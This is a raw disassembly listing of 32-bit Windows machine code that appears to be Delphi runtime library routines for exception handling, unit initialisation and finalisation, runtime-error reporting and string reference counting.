  403029:	e8 da fe ff ff       	call   0x402f08
  40302e:	80 3d 1c 60 42 00 00 	cmpb   $0x0,0x42601c
  403035:	76 29                	jbe    0x403060
  403037:	80 3d 18 60 42 00 00 	cmpb   $0x0,0x426018
  40303e:	77 20                	ja     0x403060
  403040:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  403044:	50                   	push   %eax
  403045:	51                   	push   %ecx
  403046:	e8 41 e0 ff ff       	call   0x40108c
  40304b:	83 f8 00             	cmp    $0x0,%eax
  40304e:	58                   	pop    %eax
  40304f:	0f 84 ab 00 00 00    	je     0x403100
  403055:	89 c2                	mov    %eax,%edx
  403057:	8b 44 24 04          	mov    0x4(%esp),%eax
  40305b:	8b 48 0c             	mov    0xc(%eax),%ecx
  40305e:	eb 30                	jmp    0x403090
  403060:	89 c2                	mov    %eax,%edx
  403062:	8b 44 24 04          	mov    0x4(%esp),%eax
  403066:	8b 48 0c             	mov    0xc(%eax),%ecx
  403069:	80 3d 1c 60 42 00 01 	cmpb   $0x1,0x42601c
  403070:	76 1e                	jbe    0x403090
  403072:	80 3d 18 60 42 00 00 	cmpb   $0x0,0x426018
  403079:	77 15                	ja     0x403090
  40307b:	50                   	push   %eax
  40307c:	8d 44 24 08          	lea    0x8(%esp),%eax
  403080:	52                   	push   %edx
  403081:	51                   	push   %ecx
  403082:	50                   	push   %eax
  403083:	e8 04 e0 ff ff       	call   0x40108c
  403088:	83 f8 00             	cmp    $0x0,%eax
  40308b:	59                   	pop    %ecx
  40308c:	5a                   	pop    %edx
  40308d:	58                   	pop    %eax
  40308e:	74 70                	je     0x403100
  403090:	83 48 04 02          	orl    $0x2,0x4(%eax)
  403094:	53                   	push   %ebx
  403095:	31 db                	xor    %ebx,%ebx
  403097:	56                   	push   %esi
  403098:	57                   	push   %edi
  403099:	55                   	push   %ebp
  40309a:	64 8b 1b             	mov    %fs:(%ebx),%ebx
  40309d:	53                   	push   %ebx
  40309e:	50                   	push   %eax
  40309f:	52                   	push   %edx
  4030a0:	51                   	push   %ecx
  4030a1:	8b 54 24 28          	mov    0x28(%esp),%edx
  4030a5:	6a 00                	push   $0x0
  4030a7:	50                   	push   %eax
  4030a8:	68 b4 30 40 00       	push   $0x4030b4
  4030ad:	52                   	push   %edx
  4030ae:	ff 15 14 90 42 00    	call   *0x429014
  4030b4:	8b 7c 24 28          	mov    0x28(%esp),%edi
  4030b8:	e8 93 15 00 00       	call   0x404650
  4030bd:	ff b0 00 00 00 00    	push   0x0(%eax)
  4030c3:	89 a0 00 00 00 00    	mov    %esp,0x0(%eax)
  4030c9:	8b 6f 08             	mov    0x8(%edi),%ebp
  4030cc:	8b 5f 04             	mov    0x4(%edi),%ebx
  4030cf:	c7 47 04 e0 30 40 00 	movl   $0x4030e0,0x4(%edi)
  4030d6:	83 c3 05             	add    $0x5,%ebx
  4030d9:	e8 66 fe ff ff       	call   0x402f44
  4030de:	ff e3                	jmp    *%ebx
  4030e0:	e9 23 00 00 00       	jmp    0x403108
  4030e5:	e8 66 15 00 00       	call   0x404650
  4030ea:	8b 88 00 00 00 00    	mov    0x0(%eax),%ecx
  4030f0:	8b 11                	mov    (%ecx),%edx
  4030f2:	89 90 00 00 00 00    	mov    %edx,0x0(%eax)
  4030f8:	8b 41 08             	mov    0x8(%ecx),%eax
  4030fb:	e9 84 fc ff ff       	jmp    0x402d84
  403100:	b8 01 00 00 00       	mov    $0x1,%eax
  403105:	c3                   	ret
  403106:	8b c0                	mov    %eax,%eax
  403108:	8b 44 24 04          	mov    0x4(%esp),%eax
  40310c:	8b 54 24 08          	mov    0x8(%esp),%edx
  403110:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  403117:	74 1f                	je     0x403138
  403119:	8b 4a 04             	mov    0x4(%edx),%ecx
  40311c:	c7 42 04 38 31 40 00 	movl   $0x403138,0x4(%edx)
  403123:	53                   	push   %ebx
  403124:	56                   	push   %esi
  403125:	57                   	push   %edi
  403126:	55                   	push   %ebp
  403127:	8b 6a 08             	mov    0x8(%edx),%ebp
  40312a:	83 c1 05             	add    $0x5,%ecx
  40312d:	e8 46 fe ff ff       	call   0x402f78
  403132:	ff d1                	call   *%ecx
  403134:	5d                   	pop    %ebp
  403135:	5f                   	pop    %edi
  403136:	5e                   	pop    %esi
  403137:	5b                   	pop    %ebx
  403138:	b8 01 00 00 00       	mov    $0x1,%eax
  40313d:	c3                   	ret
  40313e:	8b c0                	mov    %eax,%eax
  403140:	8b 44 24 30          	mov    0x30(%esp),%eax
  403144:	c7 40 04 8b 31 40 00 	movl   $0x40318b,0x4(%eax)
  40314b:	e8 00 15 00 00       	call   0x404650
  403150:	8b 90 00 00 00 00    	mov    0x0(%eax),%edx
  403156:	8b 0a                	mov    (%edx),%ecx
  403158:	89 88 00 00 00 00    	mov    %ecx,0x0(%eax)
  40315e:	8b 42 0c             	mov    0xc(%edx),%eax
  403161:	83 60 04 fd          	andl   $0xfffffffd,0x4(%eax)
  403165:	81 38 de fa ed 0e    	cmpl   $0xeedfade,(%eax)
  40316b:	74 0d                	je     0x40317a
  40316d:	8b 42 08             	mov    0x8(%edx),%eax
  403170:	e8 0f fc ff ff       	call   0x402d84
  403175:	e8 72 fd ff ff       	call   0x402eec
  40317a:	31 c0                	xor    %eax,%eax
  40317c:	83 c4 14             	add    $0x14,%esp
  40317f:	64 8b 10             	mov    %fs:(%eax),%edx
  403182:	59                   	pop    %ecx
  403183:	8b 12                	mov    (%edx),%edx
  403185:	89 11                	mov    %edx,(%ecx)
  403187:	5d                   	pop    %ebp
  403188:	5f                   	pop    %edi
  403189:	5e                   	pop    %esi
  40318a:	5b                   	pop    %ebx
  40318b:	b8 01 00 00 00       	mov    $0x1,%eax
  403190:	c3                   	ret
  403191:	8d 40 00             	lea    0x0(%eax),%eax
  403194:	e8 b7 14 00 00       	call   0x404650
  403199:	8b 90 00 00 00 00    	mov    0x0(%eax),%edx
  40319f:	8b 0a                	mov    (%edx),%ecx
  4031a1:	89 88 00 00 00 00    	mov    %ecx,0x0(%eax)
  4031a7:	8b 42 08             	mov    0x8(%edx),%eax
  4031aa:	e8 d5 fb ff ff       	call   0x402d84
  4031af:	5a                   	pop    %edx
  4031b0:	8b 64 24 2c          	mov    0x2c(%esp),%esp
  4031b4:	31 c0                	xor    %eax,%eax
  4031b6:	59                   	pop    %ecx
  4031b7:	64 89 08             	mov    %ecx,%fs:(%eax)
  4031ba:	58                   	pop    %eax
  4031bb:	5d                   	pop    %ebp
  4031bc:	e8 df fd ff ff       	call   0x402fa0
  4031c1:	ff e2                	jmp    *%edx
  4031c3:	c3                   	ret
  4031c4:	31 d2                	xor    %edx,%edx
  4031c6:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4031ca:	8b 44 24 04          	mov    0x4(%esp),%eax
  4031ce:	83 c1 05             	add    $0x5,%ecx
  4031d1:	64 89 02             	mov    %eax,%fs:(%edx)
  4031d4:	ff d1                	call   *%ecx
  4031d6:	c2 0c 00             	ret    $0xc
  4031d9:	c3                   	ret
  4031da:	8b c0                	mov    %eax,%eax
  4031dc:	55                   	push   %ebp
  4031dd:	8b ec                	mov    %esp,%ebp
  4031df:	8b 55 08             	mov    0x8(%ebp),%edx
  4031e2:	8b 02                	mov    (%edx),%eax
  4031e4:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  4031e9:	7f 2c                	jg     0x403217
  4031eb:	74 5c                	je     0x403249
  4031ed:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  4031f2:	7f 15                	jg     0x403209
  4031f4:	74 57                	je     0x40324d
  4031f6:	2d 05 00 00 c0       	sub    $0xc0000005,%eax
  4031fb:	74 5c                	je     0x403259
  4031fd:	2d 87 00 00 00       	sub    $0x87,%eax
  403202:	74 3d                	je     0x403241
  403204:	48                   	dec    %eax
  403205:	74 4e                	je     0x403255
  403207:	eb 60                	jmp    0x403269
  403209:	05 71 ff ff 3f       	add    $0x3fffff71,%eax
  40320e:	83 e8 02             	sub    $0x2,%eax
  403211:	72 36                	jb     0x403249
  403213:	74 30                	je     0x403245
  403215:	eb 52                	jmp    0x403269
  403217:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  40321c:	7f 11                	jg     0x40322f
  40321e:	74 3d                	je     0x40325d
  403220:	2d 93 00 00 c0       	sub    $0xc0000093,%eax
  403225:	74 2e                	je     0x403255
  403227:	48                   	dec    %eax
  403228:	74 13                	je     0x40323d
  40322a:	48                   	dec    %eax
  40322b:	74 24                	je     0x403251
  40322d:	eb 3a                	jmp    0x403269
  40322f:	2d fd 00 00 c0       	sub    $0xc00000fd,%eax
  403234:	74 2f                	je     0x403265
  403236:	83 e8 3d             	sub    $0x3d,%eax
  403239:	74 26                	je     0x403261
  40323b:	eb 2c                	jmp    0x403269
  40323d:	b0 c8                	mov    $0xc8,%al
  40323f:	eb 2a                	jmp    0x40326b
  403241:	b0 c9                	mov    $0xc9,%al
  403243:	eb 26                	jmp    0x40326b
  403245:	b0 cd                	mov    $0xcd,%al
  403247:	eb 22                	jmp    0x40326b
  403249:	b0 cf                	mov    $0xcf,%al
  40324b:	eb 1e                	jmp    0x40326b
  40324d:	b0 c8                	mov    $0xc8,%al
  40324f:	eb 1a                	jmp    0x40326b
  403251:	b0 d7                	mov    $0xd7,%al
  403253:	eb 16                	jmp    0x40326b
  403255:	b0 ce                	mov    $0xce,%al
  403257:	eb 12                	jmp    0x40326b
  403259:	b0 d8                	mov    $0xd8,%al
  40325b:	eb 0e                	jmp    0x40326b
  40325d:	b0 da                	mov    $0xda,%al
  40325f:	eb 0a                	jmp    0x40326b
  403261:	b0 d9                	mov    $0xd9,%al
  403263:	eb 06                	jmp    0x40326b
  403265:	b0 ca                	mov    $0xca,%al
  403267:	eb 02                	jmp    0x40326b
  403269:	b0 ff                	mov    $0xff,%al
  40326b:	25 ff 00 00 00       	and    $0xff,%eax
  403270:	8b 52 0c             	mov    0xc(%edx),%edx
  403273:	e8 58 f6 ff ff       	call   0x4028d0
  403278:	5d                   	pop    %ebp
  403279:	c2 04 00             	ret    $0x4
  40327c:	8b 44 24 04          	mov    0x4(%esp),%eax
  403280:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  403287:	0f 85 89 00 00 00    	jne    0x403316
  40328d:	80 3d 18 60 42 00 00 	cmpb   $0x0,0x426018
  403294:	77 0f                	ja     0x4032a5
  403296:	8d 44 24 04          	lea    0x4(%esp),%eax
  40329a:	50                   	push   %eax
  40329b:	e8 ec dd ff ff       	call   0x40108c
  4032a0:	83 f8 00             	cmp    $0x0,%eax
  4032a3:	74 71                	je     0x403316
  4032a5:	8b 44 24 04          	mov    0x4(%esp),%eax
  4032a9:	fc                   	cld
  4032aa:	e8 59 fa ff ff       	call   0x402d08
  4032af:	8b 54 24 08          	mov    0x8(%esp),%edx
  4032b3:	6a 00                	push   $0x0
  4032b5:	50                   	push   %eax
  4032b6:	68 c2 32 40 00       	push   $0x4032c2
  4032bb:	52                   	push   %edx
  4032bc:	ff 15 14 90 42 00    	call   *0x429014
  4032c2:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  4032c6:	81 3b de fa ed 0e    	cmpl   $0xeedfade,(%ebx)
  4032cc:	8b 53 14             	mov    0x14(%ebx),%edx
  4032cf:	8b 43 18             	mov    0x18(%ebx),%eax
  4032d2:	74 1d                	je     0x4032f1
  4032d4:	8b 15 0c 90 42 00    	mov    0x42900c,%edx
  4032da:	85 d2                	test   %edx,%edx
  4032dc:	0f 84 fa fe ff ff    	je     0x4031dc
  4032e2:	89 d8                	mov    %ebx,%eax
  4032e4:	ff d2                	call   *%edx
  4032e6:	85 c0                	test   %eax,%eax
  4032e8:	0f 84 ee fe ff ff    	je     0x4031dc
  4032ee:	8b 53 0c             	mov    0xc(%ebx),%edx
  4032f1:	e8 c6 fc ff ff       	call   0x402fbc
  4032f6:	8b 0d 04 90 42 00    	mov    0x429004,%ecx
  4032fc:	85 c9                	test   %ecx,%ecx
  4032fe:	74 02                	je     0x403302
  403300:	ff d1                	call   *%ecx
  403302:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403306:	b8 d9 00 00 00       	mov    $0xd9,%eax
  40330b:	8b 51 14             	mov    0x14(%ecx),%edx
  40330e:	89 14 24             	mov    %edx,(%esp)
  403311:	e9 72 03 00 00       	jmp    0x403688
  403316:	31 c0                	xor    %eax,%eax
  403318:	c3                   	ret
  403319:	8d 40 00             	lea    0x0(%eax),%eax
  40331c:	31 d2                	xor    %edx,%edx
  40331e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403321:	64 8b 0a             	mov    %fs:(%edx),%ecx
  403324:	64 89 02             	mov    %eax,%fs:(%edx)
  403327:	89 08                	mov    %ecx,(%eax)
  403329:	c7 40 04 7c 32 40 00 	movl   $0x40327c,0x4(%eax)
  403330:	89 68 08             	mov    %ebp,0x8(%eax)
  403333:	a3 24 96 42 00       	mov    %eax,0x429624
  403338:	c3                   	ret
  403339:	8d 40 00             	lea    0x0(%eax),%eax
  40333c:	31 d2                	xor    %edx,%edx
  40333e:	a1 24 96 42 00       	mov    0x429624,%eax
  403343:	85 c0                	test   %eax,%eax
  403345:	74 1c                	je     0x403363
  403347:	64 8b 0a             	mov    %fs:(%edx),%ecx
  40334a:	39 c8                	cmp    %ecx,%eax
  40334c:	75 08                	jne    0x403356
  40334e:	8b 00                	mov    (%eax),%eax
  403350:	64 89 02             	mov    %eax,%fs:(%edx)
  403353:	c3                   	ret
  403354:	8b 09                	mov    (%ecx),%ecx
  403356:	83 f9 ff             	cmp    $0xffffffff,%ecx
  403359:	74 08                	je     0x403363
  40335b:	39 01                	cmp    %eax,(%ecx)
  40335d:	75 f5                	jne    0x403354
  40335f:	8b 00                	mov    (%eax),%eax
  403361:	89 01                	mov    %eax,(%ecx)
  403363:	c3                   	ret
  403364:	55                   	push   %ebp
  403365:	8b ec                	mov    %esp,%ebp
  403367:	83 c4 f8             	add    $0xfffffff8,%esp
  40336a:	53                   	push   %ebx
  40336b:	56                   	push   %esi
  40336c:	57                   	push   %edi
  40336d:	be 20 96 42 00       	mov    $0x429620,%esi
  403372:	8b 46 08             	mov    0x8(%esi),%eax
  403375:	85 c0                	test   %eax,%eax
  403377:	74 54                	je     0x4033cd
  403379:	8b 5e 0c             	mov    0xc(%esi),%ebx
  40337c:	8b 40 04             	mov    0x4(%eax),%eax
  40337f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403382:	33 c0                	xor    %eax,%eax
  403384:	55                   	push   %ebp
  403385:	68 b9 33 40 00       	push   $0x4033b9
  40338a:	64 ff 30             	push   %fs:(%eax)
  40338d:	64 89 20             	mov    %esp,%fs:(%eax)
  403390:	85 db                	test   %ebx,%ebx
  403392:	7e 1b                	jle    0x4033af
  403394:	4b                   	dec    %ebx
  403395:	89 5e 0c             	mov    %ebx,0xc(%esi)
  403398:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40339b:	8b 44 d8 04          	mov    0x4(%eax,%ebx,8),%eax
  40339f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4033a2:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4033a6:	74 03                	je     0x4033ab
  4033a8:	ff 55 f8             	call   *-0x8(%ebp)
  4033ab:	85 db                	test   %ebx,%ebx
  4033ad:	7f e5                	jg     0x403394
  4033af:	33 c0                	xor    %eax,%eax
  4033b1:	5a                   	pop    %edx
  4033b2:	59                   	pop    %ecx
  4033b3:	59                   	pop    %ecx
  4033b4:	64 89 10             	mov    %edx,%fs:(%eax)
  4033b7:	eb 14                	jmp    0x4033cd
  4033b9:	e9 1e fc ff ff       	jmp    0x402fdc
  4033be:	e8 a1 ff ff ff       	call   0x403364
  4033c3:	e8 78 fd ff ff       	call   0x403140
  4033c8:	e8 c7 fd ff ff       	call   0x403194
  4033cd:	5f                   	pop    %edi
  4033ce:	5e                   	pop    %esi
  4033cf:	5b                   	pop    %ebx
  4033d0:	59                   	pop    %ecx
  4033d1:	59                   	pop    %ecx
  4033d2:	5d                   	pop    %ebp
  4033d3:	c3                   	ret
  4033d4:	55                   	push   %ebp
  4033d5:	8b ec                	mov    %esp,%ebp
  4033d7:	83 c4 f8             	add    $0xfffffff8,%esp
  4033da:	53                   	push   %ebx
  4033db:	56                   	push   %esi
  4033dc:	57                   	push   %edi
  4033dd:	bf 20 96 42 00       	mov    $0x429620,%edi
  4033e2:	8b 47 08             	mov    0x8(%edi),%eax
  4033e5:	85 c0                	test   %eax,%eax
  4033e7:	74 54                	je     0x40343d
  4033e9:	8b 30                	mov    (%eax),%esi
  4033eb:	33 db                	xor    %ebx,%ebx
  4033ed:	8b 40 04             	mov    0x4(%eax),%eax
  4033f0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4033f3:	33 c0                	xor    %eax,%eax
  4033f5:	55                   	push   %ebp
  4033f6:	68 29 34 40 00       	push   $0x403429
  4033fb:	64 ff 30             	push   %fs:(%eax)
  4033fe:	64 89 20             	mov    %esp,%fs:(%eax)
  403401:	3b f3                	cmp    %ebx,%esi
  403403:	7e 1a                	jle    0x40341f
  403405:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403408:	8b 04 d8             	mov    (%eax,%ebx,8),%eax
  40340b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40340e:	43                   	inc    %ebx
  40340f:	89 5f 0c             	mov    %ebx,0xc(%edi)
  403412:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  403416:	74 03                	je     0x40341b
  403418:	ff 55 f8             	call   *-0x8(%ebp)
  40341b:	3b f3                	cmp    %ebx,%esi
  40341d:	7f e6                	jg     0x403405
  40341f:	33 c0                	xor    %eax,%eax
  403421:	5a                   	pop    %edx
  403422:	59                   	pop    %ecx
  403423:	59                   	pop    %ecx
  403424:	64 89 10             	mov    %edx,%fs:(%eax)
  403427:	eb 14                	jmp    0x40343d
  403429:	e9 ae fb ff ff       	jmp    0x402fdc
  40342e:	e8 31 ff ff ff       	call   0x403364
  403433:	e8 08 fd ff ff       	call   0x403140
  403438:	e8 57 fd ff ff       	call   0x403194
  40343d:	5f                   	pop    %edi
  40343e:	5e                   	pop    %esi
  40343f:	5b                   	pop    %ebx
  403440:	59                   	pop    %ecx
  403441:	59                   	pop    %ecx
  403442:	5d                   	pop    %ebp
  403443:	c3                   	ret
  403444:	c7 05 10 90 42 00 7c 	movl   $0x40107c,0x429010
  40344b:	10 40 00 
  40344e:	c7 05 14 90 42 00 84 	movl   $0x401084,0x429014
  403455:	10 40 00 
  403458:	a3 28 96 42 00       	mov    %eax,0x429628
  40345d:	33 c0                	xor    %eax,%eax
  40345f:	a3 2c 96 42 00       	mov    %eax,0x42962c
  403464:	89 15 30 96 42 00    	mov    %edx,0x429630
  40346a:	8b 42 04             	mov    0x4(%edx),%eax
  40346d:	a3 1c 90 42 00       	mov    %eax,0x42901c
  403472:	e8 a5 fe ff ff       	call   0x40331c
  403477:	c6 05 24 90 42 00 00 	movb   $0x0,0x429024
  40347e:	e8 51 ff ff ff       	call   0x4033d4
  403483:	c3                   	ret
  403484:	53                   	push   %ebx
  403485:	56                   	push   %esi
  403486:	57                   	push   %edi
  403487:	be 5c 60 42 00       	mov    $0x42605c,%esi
  40348c:	b1 10                	mov    $0x10,%cl
  40348e:	8b 1d 00 60 42 00    	mov    0x426000,%ebx
  403494:	8b c3                	mov    %ebx,%eax
  403496:	bf 0a 00 00 00       	mov    $0xa,%edi
  40349b:	99                   	cltd
  40349c:	f7 ff                	idiv   %edi
  40349e:	80 c2 30             	add    $0x30,%dl
  4034a1:	33 c0                	xor    %eax,%eax
  4034a3:	8a c1                	mov    %cl,%al
  4034a5:	88 14 06             	mov    %dl,(%esi,%eax,1)
  4034a8:	8b c3                	mov    %ebx,%eax
  4034aa:	bb 0a 00 00 00       	mov    $0xa,%ebx
  4034af:	99                   	cltd
  4034b0:	f7 fb                	idiv   %ebx
  4034b2:	8b d8                	mov    %eax,%ebx
  4034b4:	49                   	dec    %ecx
  4034b5:	85 db                	test   %ebx,%ebx
  4034b7:	75 db                	jne    0x403494
  4034b9:	b1 1c                	mov    $0x1c,%cl
  4034bb:	a1 04 60 42 00       	mov    0x426004,%eax
  4034c0:	8b d0                	mov    %eax,%edx
  4034c2:	83 e2 0f             	and    $0xf,%edx
  4034c5:	8a 92 7c 60 42 00    	mov    0x42607c(%edx),%dl
  4034cb:	33 db                	xor    %ebx,%ebx
  4034cd:	8a d9                	mov    %cl,%bl
  4034cf:	88 14 1e             	mov    %dl,(%esi,%ebx,1)
  4034d2:	c1 e8 04             	shr    $0x4,%eax
  4034d5:	49                   	dec    %ecx
  4034d6:	85 c0                	test   %eax,%eax
  4034d8:	75 e6                	jne    0x4034c0
  4034da:	5f                   	pop    %edi
  4034db:	5e                   	pop    %esi
  4034dc:	5b                   	pop    %ebx
  4034dd:	c3                   	ret
  4034de:	8b c0                	mov    %eax,%eax
  4034e0:	31 c0                	xor    %eax,%eax
  4034e2:	87 05 00 60 42 00    	xchg   %eax,0x426000
  4034e8:	f7 d8                	neg    %eax
  4034ea:	19 c0                	sbb    %eax,%eax
  4034ec:	40                   	inc    %eax
  4034ed:	bf 20 96 42 00       	mov    $0x429620,%edi
  4034f2:	8b 5f 18             	mov    0x18(%edi),%ebx
  4034f5:	8b 6f 14             	mov    0x14(%edi),%ebp
  4034f8:	ff 77 1c             	push   0x1c(%edi)
  4034fb:	ff 77 20             	push   0x20(%edi)
  4034fe:	8b 37                	mov    (%edi),%esi
  403500:	b9 0b 00 00 00       	mov    $0xb,%ecx
  403505:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403507:	5f                   	pop    %edi
  403508:	5e                   	pop    %esi
  403509:	c9                   	leave
  40350a:	c2 0c 00             	ret    $0xc
  40350d:	c3                   	ret
  40350e:	8b c0                	mov    %eax,%eax
  403510:	51                   	push   %ecx
  403511:	80 3d 34 90 42 00 00 	cmpb   $0x0,0x429034
  403518:	74 57                	je     0x403571
  40351a:	66 81 3d 08 92 42 00 	cmpw   $0xd7b2,0x429208
  403521:	b2 d7 
  403523:	75 14                	jne    0x403539
  403525:	83 3d 10 92 42 00 00 	cmpl   $0x0,0x429210
  40352c:	76 0b                	jbe    0x403539
  40352e:	b8 04 92 42 00       	mov    $0x429204,%eax
  403533:	ff 15 20 92 42 00    	call   *0x429220
  403539:	6a 00                	push   $0x0
  40353b:	8d 44 24 04          	lea    0x4(%esp),%eax
  40353f:	50                   	push   %eax
  403540:	6a 1e                	push   $0x1e
  403542:	68 5c 60 42 00       	push   $0x42605c
  403547:	6a f5                	push   $0xfffffff5
  403549:	e8 26 db ff ff       	call   0x401074
  40354e:	50                   	push   %eax
  40354f:	e8 40 db ff ff       	call   0x401094
  403554:	6a 00                	push   $0x0
  403556:	8d 44 24 04          	lea    0x4(%esp),%eax
  40355a:	50                   	push   %eax
  40355b:	6a 02                	push   $0x2
  40355d:	68 98 35 40 00       	push   $0x403598
  403562:	6a f5                	push   $0xfffffff5
  403564:	e8 0b db ff ff       	call   0x401074
  403569:	50                   	push   %eax
  40356a:	e8 25 db ff ff       	call   0x401094
  40356f:	5a                   	pop    %edx
  403570:	c3                   	ret
  403571:	80 3d 20 60 42 00 00 	cmpb   $0x0,0x426020
  403578:	75 13                	jne    0x40358d
  40357a:	6a 00                	push   $0x0
  40357c:	68 54 60 42 00       	push   $0x426054
  403581:	68 5c 60 42 00       	push   $0x42605c
  403586:	6a 00                	push   $0x0
  403588:	e8 17 db ff ff       	call   0x4010a4
  40358d:	5a                   	pop    %edx
  40358e:	c3                   	ret
  40358f:	00 ff                	add    %bh,%bh
  403591:	ff                   	(bad)
  403592:	ff                   	(bad)
  403593:	ff 02                	incl   (%edx)
  403595:	00 00                	add    %al,(%eax)
  403597:	00 0d 0a 00 00 53    	add    %cl,0x5300000a
  40359d:	56                   	push   %esi
  40359e:	57                   	push   %edi
  40359f:	55                   	push   %ebp
  4035a0:	51                   	push   %ecx
  4035a1:	bb 20 96 42 00       	mov    $0x429620,%ebx
  4035a6:	be 30 90 42 00       	mov    $0x429030,%esi
  4035ab:	80 7b 28 00          	cmpb   $0x0,0x28(%ebx)
  4035af:	75 16                	jne    0x4035c7
  4035b1:	83 3e 00             	cmpl   $0x0,(%esi)
  4035b4:	74 11                	je     0x4035c7
  4035b6:	8b 06                	mov    (%esi),%eax
  4035b8:	89 04 24             	mov    %eax,(%esp)
  4035bb:	33 c0                	xor    %eax,%eax
  4035bd:	89 06                	mov    %eax,(%esi)
  4035bf:	ff 14 24             	call   *(%esp)
  4035c2:	83 3e 00             	cmpl   $0x0,(%esi)
  4035c5:	75 ef                	jne    0x4035b6
  4035c7:	83 3d 04 60 42 00 00 	cmpl   $0x0,0x426004
  4035ce:	74 11                	je     0x4035e1
  4035d0:	e8 af fe ff ff       	call   0x403484
  4035d5:	e8 36 ff ff ff       	call   0x403510
  4035da:	33 c0                	xor    %eax,%eax
  4035dc:	a3 04 60 42 00       	mov    %eax,0x426004
  4035e1:	80 7b 28 02          	cmpb   $0x2,0x28(%ebx)
  4035e5:	75 0e                	jne    0x4035f5
  4035e7:	83 3d 00 60 42 00 00 	cmpl   $0x0,0x426000
  4035ee:	75 05                	jne    0x4035f5
  4035f0:	33 c0                	xor    %eax,%eax
  4035f2:	89 43 0c             	mov    %eax,0xc(%ebx)
  4035f5:	e8 6a fd ff ff       	call   0x403364
  4035fa:	80 7b 28 01          	cmpb   $0x1,0x28(%ebx)
  4035fe:	76 09                	jbe    0x403609
  403600:	83 3d 00 60 42 00 00 	cmpl   $0x0,0x426000
  403607:	74 23                	je     0x40362c
  403609:	8b 7b 10             	mov    0x10(%ebx),%edi
  40360c:	85 ff                	test   %edi,%edi
  40360e:	74 1c                	je     0x40362c
  403610:	8b c7                	mov    %edi,%eax
  403612:	e8 5d 0d 00 00       	call   0x404374
  403617:	8b 6b 10             	mov    0x10(%ebx),%ebp
  40361a:	8b 75 10             	mov    0x10(%ebp),%esi
  40361d:	3b 75 04             	cmp    0x4(%ebp),%esi
  403620:	74 0a                	je     0x40362c
  403622:	85 f6                	test   %esi,%esi
  403624:	74 06                	je     0x40362c
  403626:	56                   	push   %esi
  403627:	e8 80 da ff ff       	call   0x4010ac
  40362c:	e8 0b fd ff ff       	call   0x40333c
  403631:	80 7b 28 01          	cmpb   $0x1,0x28(%ebx)
  403635:	75 03                	jne    0x40363a
  403637:	ff 53 24             	call   *0x24(%ebx)
  40363a:	80 7b 28 00          	cmpb   $0x0,0x28(%ebx)
  40363e:	74 05                	je     0x403645
  403640:	e8 9b fe ff ff       	call   0x4034e0
  403645:	83 3b 00             	cmpl   $0x0,(%ebx)
  403648:	75 1a                	jne    0x403664
  40364a:	83 3d 18 90 42 00 00 	cmpl   $0x0,0x429018
  403651:	74 06                	je     0x403659
  403653:	ff 15 18 90 42 00    	call   *0x429018
  403659:	a1 00 60 42 00       	mov    0x426000,%eax
  40365e:	50                   	push   %eax
  40365f:	e8 38 da ff ff       	call   0x40109c
  403664:	8b 03                	mov    (%ebx),%eax
  403666:	8b f0                	mov    %eax,%esi
  403668:	8b fb                	mov    %ebx,%edi
  40366a:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40366f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403671:	e9 6b ff ff ff       	jmp    0x4035e1
  403676:	5a                   	pop    %edx
  403677:	5d                   	pop    %ebp
  403678:	5f                   	pop    %edi
  403679:	5e                   	pop    %esi
  40367a:	5b                   	pop    %ebx
  40367b:	c3                   	ret
  40367c:	a3 00 60 42 00       	mov    %eax,0x426000
  403681:	e8 16 ff ff ff       	call   0x40359c
  403686:	c3                   	ret
  403687:	90                   	nop
  403688:	8f 05 04 60 42 00    	pop    0x426004
  40368e:	e9 e9 ff ff ff       	jmp    0x40367c
  403693:	c3                   	ret
  403694:	8b 10                	mov    (%eax),%edx
  403696:	85 d2                	test   %edx,%edx
  403698:	74 1c                	je     0x4036b6
  40369a:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4036a0:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4036a3:	49                   	dec    %ecx
  4036a4:	7c 10                	jl     0x4036b6
  4036a6:	f0 ff 4a f8          	lock decl -0x8(%edx)
  4036aa:	75 0a                	jne    0x4036b6
  4036ac:	50                   	push   %eax
  4036ad:	8d 42 f8             	lea    -0x8(%edx),%eax
  4036b0:	e8 ab f1 ff ff       	call   0x402860
  4036b5:	58                   	pop    %eax
  4036b6:	c3                   	ret
  4036b7:	90                   	nop
  4036b8:	53                   	push   %ebx
  4036b9:	56                   	push   %esi
  4036ba:	89 c3                	mov    %eax,%ebx
  4036bc:	89 d6                	mov    %edx,%esi
  4036be:	8b 13                	mov    (%ebx),%edx
  4036c0:	85 d2                	test   %edx,%edx
  4036c2:	74 1a                	je     0x4036de
  4036c4:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  4036ca:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4036cd:	49                   	dec    %ecx
  4036ce:	7c 0e                	jl     0x4036de
  4036d0:	f0 ff 4a f8          	lock decl -0x8(%edx)
  4036d4:	75 08                	jne    0x4036de
  4036d6:	8d 42 f8             	lea    -0x8(%edx),%eax
  4036d9:	e8 82 f1 ff ff       	call   0x402860
  4036de:	83 c3 04             	add    $0x4,%ebx
  4036e1:	4e                   	dec    %esi
  4036e2:	75 da                	jne    0x4036be
  4036e4:	5e                   	pop    %esi
  4036e5:	5b                   	pop    %ebx
  4036e6:	c3                   	ret
  4036e7:	90                   	nop
  4036e8:	85 d2                	test   %edx,%edx
  4036ea:	74 24                	je     0x403710
  4036ec:	8b 4a f8             	mov    -0x8(%edx),%ecx
